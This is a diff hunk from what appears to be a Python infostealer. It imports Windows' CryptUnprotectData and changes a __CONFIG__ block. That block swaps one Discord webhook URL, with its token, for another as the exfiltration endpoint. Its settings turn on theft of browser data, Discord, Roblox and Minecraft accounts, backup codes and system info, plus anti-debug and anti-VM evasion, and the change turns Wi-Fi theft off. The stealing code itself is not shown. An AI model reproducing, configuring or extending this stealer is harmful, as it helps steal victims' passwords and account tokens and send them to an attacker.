@@ -23,7 +23,7 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
 
-__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1183465328865460275/THytaxqWy6JAXVG6SuPtUIJ48swiVHw9nE0grX65DcR64Cvl-zT_kOzicxJVsn-CH5-e', 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': True, 'discord': True, 'anti_spam': False, 'self_destruct': False, 'clipboard': False}
+__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1190366074076659802/oruYfivOG5wTw0kyulUwu7sMRWOKXuU7fzwK-y9ZaqcfnDwRpAHqLI3zKpgCJtag68-N', 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': True, 'wifi': False, 'killprotector': False, 'antidebug_vm': True, 'discord': True, 'anti_spam': False, 'self_destruct': False, 'clipboard': False}
 
 #global variables
 temp = os.getenv("temp")
